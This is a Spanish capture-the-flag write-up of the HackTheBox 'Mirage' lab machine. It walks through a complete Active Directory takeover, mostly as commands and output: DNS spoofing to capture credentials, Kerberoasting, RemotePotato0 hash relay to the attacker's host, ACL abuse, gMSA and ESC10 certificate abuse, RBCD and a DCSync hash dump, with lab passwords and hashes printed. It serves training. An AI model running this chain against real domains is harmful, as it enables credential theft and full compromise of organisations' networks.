# Enumeración

>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.10.11.78
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-13 15:08 EST
Nmap scan report for 10.10.11.78
Host is up (0.062s latency).
Not shown: 62937 closed tcp ports (reset), 2569 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-14 03:08:29Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
51972/tcp open  msrpc         Microsoft Windows RPC
51981/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
51982/tcp open  msrpc         Microsoft Windows RPC
51997/tcp open  msrpc         Microsoft Windows RPC
52003/tcp open  msrpc         Microsoft Windows RPC
52018/tcp open  msrpc         Microsoft Windows RPC
52034/tcp open  msrpc         Microsoft Windows RPC
58759/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.97 seconds
```

>Agregamos los nombres de dominio encontrados en el escaneo al resolutor local para poder resolver sus nombres DNS:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ echo "10.10.11.78 DC01.mirage.htb mirage.htb" >> /etc/hosts
```

>Listamos los shares disponibles de NFS al estar el puerto TCP 2049 abierto:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ showmount -e 10.10.11.78
Export list for 10.10.11.78:
/MirageReports (everyone)
```

>Montamos el share en local para acceder a su contenido, para ello usamos la versión 3 de NFS para evitar que las reglas de ACL avanzadas de la versión 4 nos de problemas para acceder a su contenido:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ mkdir mnt
                                                                                                                                                                          
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ sudo mount -t nfs -o vers=3 10.10.11.78:/MirageReports mnt

┌──(kali㉿jbkira)-[~/Desktop/machines/mirage/mnt]
└─$ ls -la
total 17493
drwxrwxrwx 2 4294967294 4294967294      64 May 26  2025 .
drwxrwxr-x 3 kali       kali          4096 Dec  4 08:50 ..
-rwx------ 1 4294967294 4294967294 8530639 May 20  2025 Incident_Report_Missing_DNS_Record_nats-svc.pdf
-rwx------ 1 4294967294 4294967294 9373389 May 26  2025 Mirage_Authentication_Hardening_Report.pdf
```

>Creamos un usuario "faker" con useradd y cambiamos en el /etc/passwd su UID para que corresponda al que aparece en la share:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage/mnt]
└─$ useradd faker

# cambiamos en el passwd el uid a 4294967294
```

>Nos conectamos como el usuario faker y copiamos el contenido de la share a /tmp, ahora le cambiamos el dueño a los archivos y los traemos al directorio de trabajo para poder acceder a ellos:

```
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ sudo -u faker cp * /tmp

┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ sudo chown kali:kali /tmp/*.pdf

┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ cp /tmp/*.pdf .
```

>En el pdf vemos actualizaciones DNS dinámicas insecure and secure y el FQDN **nats-svc.mirage.htb** el cual vamos a spoofear, nos descargamos un servidor nats y lo ponemos en escucha a la vez de wireshark:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ wireshark &>/dev/null & disown

┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ git clone https://github.com/nats-io/nats-server

┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ cd nats-server

┌──(kali㉿jbkira)-[~/Desktop/machines/mirage/nats-server]
└─$ go build

┌──(kali㉿jbkira)-[~/Desktop/machines/mirage/nats-server]
└─$ ./nats-server -DVV
```

>Ahora agregamos un registro A al DNS que sea el FQDN encontrado anteriormente y que apunte a nuestra dirección IP:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ nsupdate
server 10.10.11.78
update add nats-svc.mirage.htb 3600 A 10.10.11.78
send
```

>Si vemos wireshark y le damos a la opción **Follow tcp stream** en un paquete TCP que venga de la dirección IP del DC vemos credenciales: `Dev_Account_A:hx5h7F5554fP@1337!`

<img width="1157" height="793" alt="image" src="https://github.com/user-attachments/assets/bfb6d894-8240-490d-9f79-070e730363b4" />

>Ahora instalamos un cliente nats y vamos a acceder con las credenciales encontradas, en el servidor nats encontramos otras credenciales nuevas: `david.jjackson:pN8kQmn6b86!1234@`

```
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ go install github.com/nats-io/natscli/nats@latest

┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ nats context add Whatever --user Dev_Account_A --password 'hx5h7F5554fP@1337!' --server nats://10.10.11.78:4222

┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ nats --context Whatever stream view   
[Whatever] ? Select a Stream auth_logs
[1] Subject: logs.auth Received: 2025-05-05 03:18:56
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


[2] Subject: logs.auth Received: 2025-05-05 03:19:24
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


[3] Subject: logs.auth Received: 2025-05-05 03:19:25
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


[4] Subject: logs.auth Received: 2025-05-05 03:19:26
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


[5] Subject: logs.auth Received: 2025-05-05 03:19:27
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


09:23:54 Reached apparent end of data
```

>Sincronizamos nuestro reloj con el DC y vamos a obtener un archivo de configuración de kerberos mediante netexec:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ sudo ntpdate 10.10.11.78

┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ nxc smb DC01.mirage.htb -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -k --generate-krb5-file mirage.krb5
SMB         DC01.mirage.htb 445    DC01             [*]  x64 (name:DC01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC01.mirage.htb 445    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@

export KRB5_CONFIG=mirage.krb5
```

>Obtenemos archivos para ingestar en bloodhound empleando las credenciales encontradas mediante autenticación por Kerberos:

```
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ bloodhound-ce-python -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -k -ns 10.10.11.78 -d mirage.htb -c all --zip
```

>Si en Bloodhound tras ingestar los archivos buscamos usuarios Kerberoasteables vemos al usuario **nathan.aadam**:

<img width="1071" height="646" alt="image" src="https://github.com/user-attachments/assets/19ca4914-75b9-4266-8a66-4bb1e4046f25" />

>Vamos a emplear netexec para realizar un ataque de Kerberoasting y guardar el hash resultante en un archivo para posteriormente crackearlo con hashcat y obtener las credenciales: `nathan.aadam:3edc#EDC3`

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ nxc ldap DC01.mirage.htb -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -k --kerberoast nathan

┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ hashcat -m 13100 nathan /usr/share/wordlists/rockyou.txt --force
```

>Vemos que el usuario **Nathan.Aadam** pertenece al grupo **Remote Management Users**, lo que le permitiría acceder por **WinRM** al DC:

<img width="805" height="255" alt="image" src="https://github.com/user-attachments/assets/02531434-ee1d-4b85-9c2e-c57cbb685248" />

>Obtenemos un TGT para el usuario **nathan.aadam** y nos conectamos al DC por **WinRM**, recordar que para acceder usando evil-winrm por Kerberos hay que tener un archivo de configuración válido para el realm, el cual obtuvimos antes con netexec aunque se puede configurar a mano:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ impacket-getTGT 'mirage.htb/nathan.aadam:3edc#EDC3'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in nathan.aadam.ccache
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ export KRB5CCNAME=nathan.aadam.ccache; evil-winrm -i dc01.mirage.htb --realm mirage.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\nathan.aadam\Desktop> cat user.txt
01838e2491adeeef61a955b8ffd9da60
```

>Vemos que en la máquina hay otro user logueado, si no se realiza el comando con **RunasCs.exe** no se va a reportar ningún usuario logueado:

```bash
*Evil-WinRM* PS C:\Users\nathan.aadam\Desktop> .\RunasCs.exe nathan.aadam 3edc#EDC3 qwinsta
[*] Warning: The logon for user 'nathan.aadam' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           mark.bbond                1  Active
```

>Al probar a usar **RemotePotato0** para mediante una vulnerabilidad antigua "parcheada" obtener el hash NTLMv2 del usuario logueado vemos que pudimos obtenerlo:  https://github.com/antonioCoco/RemotePotato0

```bash
# En nuestro kali, primero reenviamos el puerto 135 al 9999 de la máquina víctima (esto es un bypass del parche de la vulnerabilidad) 
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.78:9999
```

```powershell
*Evil-WinRM* PS C:\Users\nathan.aadam\Desktop> .\RemotePotato0.exe -m 2 -x 10.10.15.39
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9999
[*] Example Network redirector:
	sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9999
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] Calling CoGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] RPC relay server listening on port 9997 ...
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ...
[*] IStoragetrigger written: 104 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 9999
[+] User hash stolen!

NTLMv2 Client	: DC01
NTLMv2 Username	: MIRAGE\mark.bbond
NTLMv2 Hash	: mark.bbond::MIRAGE:c2b3d806495598e7:4af7e1bde984b2cefbebbefafcb77c66:0101000000000000e3839eeb6865dc0150a073b76197dc500000000002000c004d0049005200410047004500010008004400430030003100040014006d00690072006100670065002e0068007400620003001e0064006300300031002e006d00690072006100670065002e00680074006200050014006d00690072006100670065002e0068007400620007000800e3839eeb6865dc010600040006000000080030003000000000000000010000000020000031df91a16e4bd7621f7845f72c7050c61f91b2d95364cc7a2dfd3a93a83cae4f0a00100000000000000000000000000000000000090000000000000000000000
```

>Crackeamos el hash con hashcat y la máscara 5600 correspondiente a hashes NTLMv2: `mark.bbond:1day@atime`

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ hashcat -m 5600 mark /usr/share/wordlists/rockyou.txt --show
MARK.BBOND::MIRAGE:c2b3d806495598e7:4af7e1bde984b2cefbebbefafcb77c66:0101000000000000e3839eeb6865dc0150a073b76197dc500000000002000c004d0049005200410047004500010008004400430030003100040014006d00690072006100670065002e0068007400620003001e0064006300300031002e006d00690072006100670065002e00680074006200050014006d00690072006100670065002e0068007400620007000800e3839eeb6865dc010600040006000000080030003000000000000000010000000020000031df91a16e4bd7621f7845f72c7050c61f91b2d95364cc7a2dfd3a93a83cae4f0a00100000000000000000000000000000000000090000000000000000000000:1day@atime

```

>Vemos que el usuario **Mark.Bbond** tiene la ACE **ForceChangePassword** sobre el usuario **Javier.Mmarshall**:

<img width="805" height="233" alt="image" src="https://github.com/user-attachments/assets/d2456e20-9d43-4f26-b60d-1c455e747bdd" />

>Vamos a abusar esa ACE para cambiarle la credencial al usuario mediante **BloodyAD**, pero vemos que nos revoca las credenciales aunque sean cambiadas:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u mark.bbond -p '1day@atime' set password javier.mmarshall 'Password123$!'
[+] Password changed successfully!

┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ nxc smb dc01.mirage.htb -u javier.mmarshall -p 'Password123$!' -k                                                           
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [-] mirage.htb\javier.mmarshall:Password123$! KDC_ERR_CLIENT_REVOKED
```

>Si revisamos los atributos del usuario vemos que en el UAC la cuenta tiene la flag **ACCOUNTDISABLE** que no le permite logguearse, así que vamos a quitarsela:

```bash
bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u mark.bbond -p '1day@atime' get object javier.mmarshall 
<SNIP>
userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD

┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u mark.bbond -p '1day@atime' remove uac javier.mmarshall -f ACCOUNTDISABLE 
[+] ['ACCOUNTDISABLE'] property flags removed from javier.mmarshall's userAccountControl
```

>Además habrá que modificar las logonHours para que coincida con las de nuestro usuario válido ya que también le impiden logguearse:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u mark.bbond -p '1day@atime' get writable --detail

<SNIP>

distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
logonHours: WRITE
userAccountControl: WRITE

┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u mark.bbond -p '1day@atime' set object javier.mmarshall logonHours -v '////////////////////////////' --b64
[!] Attribute encoding not supported for logonHours with bytes attribute type, using raw mode
[+] javier.mmarshall's logonHours has been updated
```

>Ahora ya podremos acceder como el usuario **javier.mmarshall**, así que vamos a obtener un TGT antes de que algún script revierta nuestros cambios:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ nxc smb dc01.mirage.htb -u javier.mmarshall -p 'Password123$!' -k
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\javier.mmarshall:Password123$! 
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ impacket-getTGT 'mirage.htb/javier.mmarshall:Password123$!'                   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in javier.mmarshall.ccache
```

>Vemos que el usuario **Javier.Mmarshall** tiene la ACE **ReadGMSAPassword** sobre el usuario de máquina **Mirage-service$**:

<img width="680" height="363" alt="image" src="https://github.com/user-attachments/assets/34d0bd6d-ddea-47c0-a0f9-2e161dc9b7f4" />

>Vamos a abusar la ACE para obtener el hash NTLM de la cuenta de máquina de servicio (gmsa) **Group Managed Service Accounts**: `mirage-service$:edb5e64a04fe919e5c3fa6bfbf3c54d9`

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ nxc ldap dc01.mirage.htb -u javier.mmarshall -p 'Password123$!' -k --gmsa
LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:mirage.htb)
LDAP        dc01.mirage.htb 389    DC01             [+] mirage.htb\javier.mmarshall:Password123$! 
LDAP        dc01.mirage.htb 389    DC01             [*] Getting GMSA Passwords
LDAP        dc01.mirage.htb 389    DC01             Account: Mirage-Service$      NTLM: edb5e64a04fe919e5c3fa6bfbf3c54d9     PrincipalsAllowedToReadPassword: javier.mmarshall
```

>Vemos que podemos cambiar el UserPrincipalName del usuario mark.bbond siendo **mirage-service$**:

```bash
bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u mirage-service\$ get writable --detail

<SNIP>
userPrincipalName: WRITE
```

>Además vemos que en el registro `HKLM:System\CurrentControlSet\Control\SecurityProviders\Schannel` **CertificateMappingMethods** está en 4: 

```
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> Get-Item -path HKLM:System\CurrentControlSet\Control\SecurityProviders\Schannel


    Hive: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders


Name                           Property
----                           --------
Schannel                       EventLogging              : 1
                               CertificateMappingMethods : 4
```

>Esto nos permitiría realizar un ataque ESC10, para ello, vamos a primero modificar el UPN de mark.bbond para que sea el de la cuenta de máquina del DC:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u mirage-service\$ set object mark.bbond userPrincipalName -v 'DC01$@mirage.htb'
[+] mark.bbond's userPrincipalName has been updated
```

>Ahora vamos a obtener un certificado mediante la plantilla User para **mark.bbond** y vemos que obtenemos un certificado de **DC01$**:

```
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ certipy req -u mark.bbond@mirage.htb -p '1day@atime' -k -dc-ip 10.10.11.78 -target dc01.mirage.htb -ca mirage-DC01-CA -template 'User'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 11
[*] Successfully requested certificate
[*] Got certificate with UPN 'DC01$@mirage.htb'
[*] Certificate object SID is 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Saving certificate and private key to 'dc01.pfx'
[*] Wrote certificate and private key to 'dc01.pfx'
```

>Si volvemos a poner su UPN al que tenía antes, podremos usar el certificado obtenido para ganar acceso a una shell de ldap interactiva como DC01$:

```
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u mirage-service\$ set object mark.bbond userPrincipalName -v 'mark.bbond@mirage.htb'
[+] mark.bbond's userPrincipalName has been updated

┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ certipy auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'DC01$@mirage.htb'
[*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Connecting to 'ldaps://10.10.11.78:636'
[*] Authenticated to '10.10.11.78' as: 'u:MIRAGE\\DC01$'
Type help for list of commands

# whoami
u:MIRAGE\DC01$
```

>Desde aquí, habilitaremos RBCD (**Resource-Based Constrained Delegation**) para que Mirage-service$ pueda crear tickets en nombre de **DC01$**:

```
# set_rbcd DC01$ mirage-service$
Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000

Found Grantee DN: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1112
Delegation rights modified successfully!
mirage-service$ can now impersonate users on DC01$ via S4U2Proxy
```

>Ahora explotamos el **RBCD** para obtener ticket de **DC01$** mediante S4U2Proxy:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ export KRB5CCNAME=mirage-service\$.ccache; impacket-getST -spn http/dc01.mirage.htb -impersonate dc01$ 'mirage.htb/mirage-service$' -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating dc01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc01$@http_dc01.mirage.htb@MIRAGE.HTB.ccache
```

>Usamos el ticket obtenido mediante RBCD para hacer un **DCSync** y así obtener los hashes NTLM de todos los usuarios del dominio:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ export KRB5CCNAME=dc01\$@http_dc01.mirage.htb@MIRAGE.HTB.ccache; impacket-secretsdump -no-pass -k dc01.mirage.htb -just-dc-ntlm    
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1adcc3d4a7f007ca8ab8a3a671a66127:::
mirage.htb\Dev_Account_A:1104:aad3b435b51404eeaad3b435b51404ee:3db621dd880ebe4d22351480176dba13:::
mirage.htb\Dev_Account_B:1105:aad3b435b51404eeaad3b435b51404ee:fd1a971892bfd046fc5dd9fb8a5db0b3:::
mirage.htb\david.jjackson:1107:aad3b435b51404eeaad3b435b51404ee:ce781520ff23cdfe2a6f7d274c6447f8:::
mirage.htb\javier.mmarshall:1108:aad3b435b51404eeaad3b435b51404ee:694fba7016ea1abd4f36d188b3983d84:::
mirage.htb\mark.bbond:1109:aad3b435b51404eeaad3b435b51404ee:8fe1f7f9e9148b3bdeb368f9ff7645eb:::
mirage.htb\nathan.aadam:1110:aad3b435b51404eeaad3b435b51404ee:1cdd3c6d19586fd3a8120b89571a04eb:::
mirage.htb\svc_mirage:2604:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
Mirage-Service$:1112:aad3b435b51404eeaad3b435b51404ee:edb5e64a04fe919e5c3fa6bfbf3c54d9:::
[*] Cleaning up... 
```

>Usamos el hash del administrador para obtener un TGT y nos conectamos por WinRM al DC para obtener la flag final:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ impacket-getTGT 'mirage.htb/administrator' -hashes :7be6d4f3c2b9c0e3560f5a29eeb1afb3
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in administrator.ccache
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/mirage]
└─$ export KRB5CCNAME=administrator.ccache; evil-winrm -i dc01.mirage.htb --realm mirage.htb                                       
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
11339e7276d789ed7e5c96878d744684
```
